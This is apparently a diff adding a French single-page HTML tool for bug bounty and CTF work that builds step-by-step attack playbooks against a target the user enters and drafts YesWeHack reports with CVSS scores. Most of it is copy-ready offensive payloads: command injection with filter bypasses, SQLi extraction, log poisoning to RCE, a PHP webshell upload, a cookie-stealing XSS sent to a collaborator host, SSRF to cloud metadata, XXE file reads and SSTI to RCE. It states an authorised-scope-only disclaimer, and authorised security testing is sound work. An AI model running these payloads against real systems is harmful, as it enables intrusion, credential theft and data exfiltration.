@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Assistant de défi — Bug Bounty / CTF — Alliance Groupe</title>
+<style>
+  :root{ --or:#E6A93C; --or2:#F37A1F; --bg:#0e1016; --bg2:#1b2030; --ok:#22c55e; --bad:#ef4444; --warn:#f59e0b; }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:system-ui,Segoe UI,Roboto,Arial,sans-serif;background:linear-gradient(160deg,var(--bg),var(--bg2));color:#e8eaf0;min-height:100vh;padding:22px}
+  .wrap{max-width:980px;margin:0 auto}
+  h1{font-size:23px;margin:0 0 4px;background:linear-gradient(90deg,var(--or),var(--or2));-webkit-background-clip:text;background-clip:text;color:transparent}
+  h2{font-size:17px;margin:22px 0 8px;color:var(--or)}
+  .sub{color:#9aa0b0;font-size:13px;margin:0 0 16px}
+  .panel{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:16px;margin:0 0 14px}
+  label{display:block;font-size:12px;color:#aab;margin:8px 0 4px;font-weight:700}
+  input,select,textarea{width:100%;padding:9px 11px;border-radius:8px;border:1px solid rgba(255,255,255,.18);background:#0b0d13;color:#fff;font-size:14px;font-family:inherit}
+  textarea{min-height:130px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px}
+  .row{display:flex;gap:12px;flex-wrap:wrap}.row>div{flex:1;min-width:150px}
+  button{cursor:pointer;border:0;border-radius:8px;font-weight:700}
+  .go{margin-top:12px;padding:11px 18px;font-size:15px;background:linear-gradient(135deg,var(--or),var(--or2));color:#1a1305;width:100%}
+  .cats{display:flex;flex-wrap:wrap;gap:6px;margin-top:6px}
+  .cat{padding:6px 11px;font-size:12px;border:1px solid rgba(255,255,255,.2);background:#0b0d13;color:#cdd;border-radius:999px}
+  .cat.on{background:linear-gradient(135deg,var(--or),var(--or2));color:#1a1305;border-color:transparent}
+  .step{background:#0b0d13;border:1px solid rgba(255,255,255,.1);border-radius:10px;padding:11px 13px;margin:10px 0}
+  .step h3{margin:0 0 6px;font-size:14px;color:var(--or)}
+  .ph{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:#7f8aa0;margin:14px 0 2px;font-weight:800}
+  pre{position:relative;background:#05070c;border:1px solid rgba(255,255,255,.12);border-radius:8px;padding:11px;overflow:auto;font-size:12.5px;color:#d7e0f0;white-space:pre-wrap;word-break:break-word;margin:6px 0}
+  .copy{position:absolute;top:7px;right:7px;background:#22304a;color:#cfe;padding:3px 9px;font-size:11px}
+  .copy.done{background:var(--ok);color:#04210f}
+  .exp{font-size:12px;color:#c7cdda;margin:5px 0 0;line-height:1.5}
+  .ok{color:var(--ok)}.bad{color:var(--bad)}.warn{color:var(--warn)}
+  .toolbar{display:flex;gap:8px;flex-wrap:wrap;margin:0 0 8px}.toolbar button{padding:7px 11px;font-size:12px;background:#22304a;color:#cfe}
+  footer{color:#6b7280;font-size:11px;text-align:center;margin:16px 0 4px}
+  .hidden{display:none}
+  .scorebox{display:flex;align-items:center;gap:14px;flex-wrap:wrap;margin:8px 0}.score{font-size:40px;font-weight:900}
+  @media print{body{background:#fff;color:#000}.toolbar,.go,.cat{display:none}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>🥋 Assistant de défi — Bug Bounty / CTF</h1>
+  <p class="sub">Kali = tes mains (tu exécutes) · cet outil = ton cerveau (route pas-à-pas + rapport YWH). Hors ligne. <b>Uniquement sous mandat / dans le scope d'un programme autorisé.</b></p>
+
+  <div class="panel">
+    <div class="row">
+      <div><label>Cible (domaine, IP ou URL)</label><input id="cible" placeholder="exemple.fr  ou  10.10.10.5" autocomplete="off"></div>
+      <div><label>Paramètre à tester (optionnel)</label><input id="param" placeholder="id, page, file, q…" autocomplete="off"></div>
+    </div>
+    <label>Type de défi / faille (choisis un ou plusieurs)</label>
+    <div class="cats" id="cats"></div>
+    <button class="go" onclick="gen()">⚙️ Générer la route pas-à-pas</button>
+  </div>
+
+  <div id="out" class="hidden">
+    <div class="toolbar"><button onclick="copyAll()">📋 Tout copier</button><button onclick="window.print()">🖨️ Imprimer / PDF</button></div>
+    <h2>① Route à suivre (dans l'ordre)</h2>
+    <div id="steps"></div>
+
+    <h2>② Générer le rapport YWH</h2>
+    <div class="panel">
+      <div class="row">
+        <div><label>Type de faille (pour le CVSS)</label>
+          <select id="rtype">
+            <option value="rce">RCE / Command Injection</option>
+            <option value="sqli">Injection SQL</option>
+            <option value="lfi">LFI / Path Traversal</option>
+            <option value="ssrf">SSRF</option>
+            <option value="idor">IDOR / BOLA</option>
+            <option value="xss">XSS (stockée)</option>
+            <option value="xssr">XSS (réfléchie)</option>
+            <option value="upload">Upload → RCE</option>
+            <option value="xxe">XXE</option>
+            <option value="ssti">SSTI</option>
+            <option value="auth">Auth / JWT</option>
+            <option value="info">Fuite d'information</option>
+          </select>
+        </div>
+        <div><label>Endpoint (URL vulnérable)</label><input id="rendpoint" placeholder="https://cible/page?id=1"></div>
+      </div>
+      <div class="row">
+        <div><label>Partie vulnérable</label>
+          <select id="rpart"><option>GET parameter</option><option>POST parameter</option><option>JSON parameter</option><option>Header</option><option>Cookie</option><option>Path</option><option>URL</option><option>Others</option></select>
+        </div>
+        <div><label>Nom du paramètre</label><input id="rparam" placeholder="id"></div>
+      </div>
+      <label>Charge utile (payload exact)</label><input id="rpayload" placeholder="ex: ; id  /  ../../etc/passwd  /  ' OR '1'='1">
+      <label>Preuve (sortie réelle, données masquées si vrai programme)</label><textarea id="rproof" placeholder="Colle la sortie qui prouve la faille (masque toute donnée réelle)"></textarea>
+      <button class="go" onclick="report()">📝 Produire le rapport (titre + description + CVSS)</button>
+    </div>
+    <div id="result" class="hidden"><div class="panel" id="resultbox"></div></div>
+  </div>
+
+  <footer>Alliance Groupe — usage sous mandat / scope autorisé uniquement. Non destructif. 100% hors ligne.</footer>
+</div>
+
+<script>
+function clean(d){d=(d||'').trim();var url=/^https?:\/\//i.test(d);var h=d.replace(/^https?:\/\//i,'').replace(/\/.*$/,'').replace(/^www\./,'');return {host:h.replace(/[^a-z0-9.\-:]/gi,''), isip:/^\d+\.\d+\.\d+\.\d+$/.test(h)};}
+function esc(s){return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+
+var CATS=[
+ {k:'recon',n:'🔎 Recon (toujours)',phase:'Reconnaissance'},
+ {k:'disco',n:'🗂️ Découverte contenu'},
+ {k:'infra',n:'🛰️ Infra / nmap'},
+ {k:'rce',n:'💥 RCE / Cmd Injection'},
+ {k:'sqli',n:'💉 SQLi'},
+ {k:'lfi',n:'📂 LFI / Traversal'},
+ {k:'xss',n:'🩹 XSS'},
+ {k:'idor',n:'🔑 IDOR / BOLA'},
+ {k:'ssrf',n:'🌐 SSRF'},
+ {k:'upload',n:'📤 Upload'},
+ {k:'xxe',n:'📃 XXE'},
+ {k:'ssti',n:'🧩 SSTI'},
+ {k:'auth',n:'🔐 Auth / JWT'}
+];
+var sel={recon:true};
+function renderCats(){var h='';CATS.forEach(function(c){h+='<span class="cat '+(sel[c.k]?'on':'')+'" data-k="'+c.k+'">'+c.n+'</span>';});document.getElementById('cats').innerHTML=h;
+ [].forEach.call(document.querySelectorAll('.cat'),function(el){el.onclick=function(){var k=el.getAttribute('data-k');sel[k]=!sel[k];el.classList.toggle('on');};});}
+renderCats();
+
+// PLAYBOOKS : chaque étape = {t:titre, c:commande, e:explication/résultat attendu}. ${U}=url https, ${T}=host, ${P}=param
+function PB(U,T,P){ return {
+recon:[
+ {t:"Empreinte techno + en-têtes", c:`whatweb -a3 ${U}\ncurl -sSI ${U}`, e:`Identifie CMS, serveur, langage, WAF, en-têtes de sécurité manquants.`},
+ {t:"Fichiers exposés", c:`curl -s ${U}/robots.txt; curl -s ${U}/sitemap.xml | head; curl -s -o /dev/null -w "%{http_code}\\n" ${U}/.git/HEAD`, e:`robots/sitemap = routes cachées. <span class="bad">.git/HEAD = 200</span> → dépôt exposé (git-dumper → code source).`},
+ {t:"Versions réelles (si CMS)", c:`curl -s -A "Mozilla/5.0" ${U}/ | grep -oE "(plugins|themes|assets)/[a-z0-9-]+/[^\\"']*ver=[0-9][0-9.]*" | sort -u`, e:`Versions dans le code = failles connues (CVE) applicables.`}
+],
+disco:[
+ {t:"Brute des chemins (ffuf)", c:`ffuf -u ${U}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403 -t 40`, e:`Trouve pages/API cachées. 403 = existe mais protégé (à creuser). 401 = auth requise.`},
+ {t:"Extensions utiles", c:`ffuf -u ${U}/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.bak,.old,.txt,.zip,.sql -mc 200 -t 40`, e:`.bak/.old/.sql/.zip = sauvegardes/code source exposés (souvent jackpot).`},
+ {t:"Endpoints dans le JS", c:`curl -s ${U}/ | grep -oE 'src="[^"]+\\.js"' ; echo "→ puis analyser chaque .js (routes /api, clés)"`, e:`Le JS des SPA expose des routes d'API non listées ailleurs.`}
+],
+infra:[
+ {t:"Scan ports + services + version", c:`nmap -Pn -sV -sC -p- --min-rate 2000 ${T}`, e:`Liste ports ouverts, services, versions. Note tout ce qui a une version (→ searchsploit).`},
+ {t:"Scripts de vulnérabilité", c:`nmap -Pn --script vuln ${T}`, e:`Détecte des failles connues sur les services (à vérifier, pas une preuve).`},
+ {t:"TLS/SSL", c:`testssl.sh ${U}`, e:`Protocoles/chiffrements faibles, certificat, heartbleed, etc.`}
+],
+rce:[
+ {t:"Tester l'injection de commande", c:`# sur le paramètre ${P} :\ncurl -s "${U}/?${P}=x;id"\ncurl -s "${U}/?${P}=x|id"\ncurl -s "${U}/?${P}=x\`id\`"\ncurl -s "${U}/?${P}=x$(id)"`, e:`Si la sortie contient <b>uid=…</b> → RCE. Teste chaque séparateur : <code>; | & && || $() \`\`</code>.`},
+ {t:"Injection à l'aveugle (time-based)", c:`time curl -s "${U}/?${P}=x;sleep 5"`, e:`Si la réponse met ~5s → RCE aveugle confirmée (pas de sortie visible mais commande exécutée).`},
+ {t:"Contourner les filtres", c:`# espace filtré → $IFS ; guillemets filtrés → redirection\ncurl -s "${U}/?${P}=x;cat\${IFS}/etc/passwd"\ncurl -s "${U}/?${P}=x;cat<flag.txt"`, e:`Adapte selon ce qui est filtré (cf. Dojo #30 : \`$(...)\` passait, \`cat<fichier\` évite l'espace).`}
+],
+sqli:[
+ {t:"Détection manuelle", c:`curl -s "${U}/?${P}=1'"\ncurl -s "${U}/?${P}=1' OR '1'='1"\ncurl -s "${U}/?${P}=1 ORDER BY 5-- -"`, e:`Erreur SQL / comportement qui change = injectable. ORDER BY trouve le nb de colonnes.`},
+ {t:"sqlmap (auto, prudent)", c:`sqlmap -u "${U}/?${P}=1" -p ${P} --batch --level=3 --risk=2 --random-agent --delay=1`, e:`Confirme + exploite. Sur prod : risk=1. Authentifié : ajoute <code>--cookie="..."</code>.`},
+ {t:"Extraction (si confirmé)", c:`sqlmap -u "${U}/?${P}=1" -p ${P} --batch --dbs\nsqlmap -u "${U}/?${P}=1" -p ${P} --batch -D <db> --tables`, e:`Prouve l'impact (liste bases/tables). Ne PAS dumper de vraies données perso.`}
+],
+lfi:[
+ {t:"Traversal basique", c:`curl -s "${U}/?${P}=../../../../etc/passwd"\ncurl -s "${U}/?${P}=....//....//etc/passwd"`, e:`Si tu vois <code>root:x:0:0</code> → LFI confirmée. <code>....//</code> contourne certains filtres.`},
+ {t:"Wrappers PHP (lire le code)", c:`curl -s "${U}/?${P}=php://filter/convert.base64-encode/resource=index"`, e:`Renvoie le code source en base64 → décode-le (révèle d'autres failles/secrets).`},
+ {t:"LFI → RCE (log poisoning)", c:`# 1) injecter du PHP dans un log via User-Agent\ncurl -s -A "<?php system(\\$_GET[c]); ?>" ${U}/\n# 2) inclure le log\ncurl -s "${U}/?${P}=/var/log/apache2/access.log&c=id"`, e:`Transforme la LFI en exécution de commande.`}
+],
+xss:[
+ {t:"XSS réfléchie", c:`# ouvre dans le navigateur :\n${U}/?${P}=<script>alert(document.domain)</script>\n${U}/?${P}="><img src=x onerror=alert(1)>`, e:`Popup = XSS. Adapte au contexte (attribut, JS, HTML). Teste l'encodage.`},
+ {t:"XSS stockée", c:`# injecte dans un champ persistant (profil, commentaire, nom) :\n"><svg onload=alert(document.domain)>`, e:`Si ça s'exécute chez un AUTRE utilisateur (ou au rechargement) → stockée = plus grave.`},
+ {t:"Preuve d'impact (vol de session)", c:`# PoC non destructif : montrer document.cookie côté attaquant\n<script>new Image().src='//TON-COLLABORATOR/?c='+document.cookie</script>`, e:`Démontre l'impact réel (exfiltration de session) sans nuire aux utilisateurs.`}
+],
+idor:[
+ {t:"Repérer un identifiant", c:`# connecté au COMPTE A, note un ID d'objet (facture, message, RDV)\ncurl -s -b "cookieA" "${U}/api/object/1001"`, e:`ID séquentiel = candidat parfait. UUID = tester quand même (parfois devinables/leakés).`},
+ {t:"Accès horizontal (compte B)", c:`# depuis le COMPTE B, demander l'objet de A\ncurl -s -b "cookieB" "${U}/api/object/1001"`, e:`<b>Si B voit les données de A → IDOR/BOLA confirmé.</b> N'utilise QUE TES 2 comptes de test.`},
+ {t:"Élévation verticale", c:`curl -s -b "cookieB" -X POST "${U}/api/admin/action" -d '{"role":"admin"}'`, e:`Un compte simple qui fait une action admin = escalade de privilèges (impact fort).`}
+],
+ssrf:[
+ {t:"Détecter le SSRF", c:`# param qui prend une URL (import, webhook, avatar, preview) :\ncurl -s "${U}/?${P}=http://TON-COLLABORATOR/"`, e:`Si ton collaborator (Burp) reçoit la requête → SSRF confirmé.`},
+ {t:"Cibler l'interne / métadonnées cloud", c:`curl -s "${U}/?${P}=http://169.254.169.254/latest/meta-data/"\ncurl -s "${U}/?${P}=http://127.0.0.1:80/"`, e:`Accès aux métadonnées cloud (clés IAM !) ou services internes = impact critique.`},
+ {t:"Contourner les filtres", c:`# variantes : http://127.1  /  http://[::1]  /  decimal  /  redirect\ncurl -s "${U}/?${P}=http://0x7f000001/"`, e:`Beaucoup de filtres SSRF sont contournables par encodage/redirection.`}
+],
+upload:[
+ {t:"Uploader un webshell", c:`# fichier shell.php : <?php system($_GET['c']); ?>\n# tenter extensions : .php .php5 .phtml .pht .phar`, e:`Si l'appli n'y filtre que ".php" → une variante passe souvent.`},
+ {t:"Contourner le contrôle", c:`# Content-Type: image/png + magic bytes GIF89a; double extension shell.php.png; .htaccess`, e:`Falsifie type MIME / entête magique. .htaccess pour faire exécuter du .png en PHP.`},
+ {t:"Exécuter", c:`curl -s "${U}/uploads/shell.php?c=id"`, e:`uid=… → RCE via upload. Chemin d'upload souvent dans la réponse ou /uploads.`}
+],
+xxe:[
+ {t:"Injecter une entité externe", c:`curl -s -X POST ${U}/endpoint -H "Content-Type: application/xml" --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'`, e:`Si /etc/passwd revient dans la réponse → XXE (lecture de fichiers).`},
+ {t:"XXE aveugle (OOB)", c:`# entité qui appelle ton serveur (exfiltration hors-bande)\n<!ENTITY % x SYSTEM "http://TON-COLLABORATOR/x.dtd">`, e:`Pour les cas sans écho : exfiltration via DTD externe vers ton collaborator.`}
+],
+ssti:[
+ {t:"Détecter le moteur", c:`# injecter dans un champ rendu par un template :\n${U}/?${P}={{7*7}}   →  49 ?\n${U}/?${P}=\${7*7}    →  49 ?`, e:`49 = SSTI. <code>{{ }}</code> = Jinja/Twig ; <code>\${ }</code> = FreeMarker/Velocity.`},
+ {t:"SSTI → RCE (Jinja2 ex.)", c:`${U}/?${P}={{cycler.__init__.__globals__.os.popen('id').read()}}`, e:`Selon le moteur, la SSTI mène à l'exécution de commande.`}
+],
+auth:[
+ {t:"JWT — algorithme none", c:`# décoder le JWT, mettre "alg":"none", retirer la signature, rejouer`, e:`Si accepté → contournement d'authentification total.`},
+ {t:"JWT — secret faible", c:`hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt`, e:`Si le secret HS256 est faible → tu forges n'importe quel token (ex: admin).`},
+ {t:"Reset / session", c:`# tester : token de reset prévisible, non expiré, réutilisable ; session non invalidée au logout`, e:`Failles logiques d'auth = souvent bien payées et sûres à tester.`}
+]
+};}
+
+function gen(){
+  var c=clean(document.getElementById('cible').value); if(!c.host){alert("Entre une cible.");return;}
+  var T=c.host, U=(/^\d+\.\d+\.\d+\.\d+$/.test(T)?('http://'+T):('https://'+T));
+  var P=(document.getElementById('param').value.trim()||'id');
+  var pb=PB(U,T,P), order=['recon','disco','infra','rce','sqli','lfi','xss','idor','ssrf','upload','xxe','ssti','auth'];
+  var html='', i=0;
+  order.forEach(function(k){ if(!sel[k]||!pb[k])return; var cat=CATS.filter(function(x){return x.k===k;})[0];
+    html+='<div class="ph">'+esc(cat.n)+'</div>';
+    pb[k].forEach(function(s){ var id='c'+(i++);
+      html+='<div class="step"><h3>'+esc(s.t)+'</h3><pre><button class="copy" onclick="cp(\''+id+'\',this)">📋 Copier</button><code id="'+id+'">'+esc(s.c)+'</code></pre><div class="exp">'+s.e+'</div></div>';
+    });
+  });
+  if(!html){alert("Choisis au moins un type (Recon est coché par défaut).");return;}
+  document.getElementById('steps').innerHTML=html;
+  // pré-remplir le rapport
+  document.getElementById('rendpoint').value=U+'/?'+P+'=1';
+  document.getElementById('rparam').value=P;
+  document.getElementById('out').classList.remove('hidden');
+  document.getElementById('out').scrollIntoView({behavior:'smooth'});
+}
+function cp(id,btn){var t=document.getElementById(id).innerText;navigator.clipboard.writeText(t).then(function(){btn.classList.add('done');btn.textContent='✓ Copié';setTimeout(function(){btn.classList.remove('done');btn.textContent='📋 Copier';},1400);});}
+function copyAll(){var b=[].slice.call(document.querySelectorAll('#steps code')).map(function(c){return c.innerText;}).join("\n\n");navigator.clipboard.writeText(b).then(function(){alert("Route copiée.");});}
+
+// --- CVSS + remédiation par type ---
+var RT={
+ rce:{v:'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',s:'9.8',n:'RCE / Command Injection',rem:'Ne pas construire de commande shell ; utiliser des API sûres / tableaux d\'arguments ; whitelist stricte.'},
+ sqli:{v:'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',s:'9.8',n:'Injection SQL',rem:'Requêtes préparées (paramétrées) partout ; ORM ; principe du moindre privilège sur le compte SQL.'},
+ lfi:{v:'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N',s:'8.6',n:'LFI / Path Traversal',rem:'Whitelist des fichiers ; interdire ../ ; basename() ; désactiver les wrappers dangereux.'},
+ ssrf:{v:'AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N',s:'8.5',n:'SSRF',rem:'Whitelist des hôtes/ports ; bloquer IP privées & 169.254.169.254 ; pas de suivi de redirection.'},
+ idor:{v:'AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N',s:'6.5',n:'IDOR / BOLA',rem:'Vérifier l\'autorisation côté serveur pour CHAQUE objet (l\'utilisateur possède-t-il la ressource ?).'},
+ xss:{v:'AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N',s:'5.4',n:'XSS stockée',rem:'Échapper à la sortie selon le contexte ; CSP ; sanitizer côté serveur.'},
+ xssr:{v:'AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',s:'6.1',n:'XSS réfléchie',rem:'Échapper la sortie ; CSP ; ne jamais réfléchir l\'entrée sans encodage.'},
+ upload:{v:'AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',s:'8.8',n:'Upload → RCE',rem:'Whitelist d\'extensions/MIME réelle ; renommer ; stocker hors webroot ; pas d\'exécution dans /uploads.'},
+ xxe:{v:'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',s:'7.5',n:'XXE',rem:'Désactiver les entités externes / DTD dans le parseur XML.'},
+ ssti:{v:'AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',s:'9.0',n:'SSTI',rem:'Ne pas injecter d\'entrée dans les templates ; sandbox ; templates logiques uniquement.'},
+ auth:{v:'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',s:'8.1',n:'Auth / JWT',rem:'Vérifier alg côté serveur ; secret fort ; tokens expirables & invalidés ; MFA.'},
+ info:{v:'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',s:'7.5',n:'Fuite d\'information',rem:'Retirer le fichier/endpoint exposé ; contrôle d\'accès ; pas de secret dans le code public.'}
+};
+function report(){
+  var t=RT[document.getElementById('rtype').value];
+  var ep=document.getElementById('rendpoint').value||'https://cible/...';
+  var part=document.getElementById('rpart').value, pn=document.getElementById('rparam').value||'id';
+  var pl=document.getElementById('rpayload').value||'<payload>';
+  var proof=document.getElementById('rproof').value||'<colle ta preuve ici>';
+  var host=clean(document.getElementById('cible').value).host||'la-cible';
+  var title=t.n+' dans '+host+' — via le paramètre '+pn;
+  var desc='## Description\n'+t.n+' détectée sur `'+host+'` via le paramètre `'+pn+'` ('+part+'). Une entrée non assainie atteint une opération sensible, permettant '+t.n.toLowerCase()+'.\n\n'
+   +'## Exploitation\n1. Cibler l\'endpoint : `'+ep+'`\n2. Injecter la charge utile dans `'+pn+'`.\n3. Observer la réponse prouvant l\'exécution/l\'accès non prévu.\n\n'
+   +'## PoC\nEndpoint : `'+ep+'`\nCharge utile : `'+pl+'`\n\nPreuve :\n```\n'+proof+'\n```\n\n'
+   +'## Risk\nImpact : '+t.n+'. Gravité CVSS 3.1 = '+t.s+' (`'+t.v+'`).\n\n'
+   +'## Remediation\n'+t.rem;
+  var col=(+t.s>=9?'#ef4444':(+t.s>=7?'#f59e0b':'#facc15'));
+  document.getElementById('resultbox').innerHTML=
+    '<div class="scorebox"><div class="score" style="color:'+col+'">'+t.s+'<span style="font-size:16px;color:#9aa0b0">/10</span></div><div><b>'+esc(t.n)+'</b><br><span style="font-size:12px;color:#9aa0b0">'+esc(t.v)+'</span></div></div>'+
+    '<h3 style="color:var(--or)">Titre (champ « Report title »)</h3><pre><button class="copy" onclick="cpv(this)">📋 Copier</button><code>'+esc(title)+'</code></pre>'+
+    '<h3 style="color:var(--or)">Description (Markdown YWH)</h3><pre><button class="copy" onclick="cpv(this)">📋 Copier</button><code>'+esc(desc)+'</code></pre>'+
+    '<p class="exp">CVSS à cliquer dans le formulaire : '+esc(t.v.replace(/\//g,' · '))+'  → score '+t.s+'.</p>';
+  document.getElementById('result').classList.remove('hidden');
+  document.getElementById('result').scrollIntoView({behavior:'smooth'});
+}
+function cpv(btn){var t=btn.parentNode.querySelector('code').innerText;navigator.clipboard.writeText(t).then(function(){btn.classList.add('done');btn.textContent='✓ Copié';setTimeout(function(){btn.classList.remove('done');btn.textContent='📋 Copier';},1400);});}
+document.getElementById('cible').addEventListener('keydown',function(e){if(e.key==='Enter')gen();});
+</script>
+</body>
+</html>
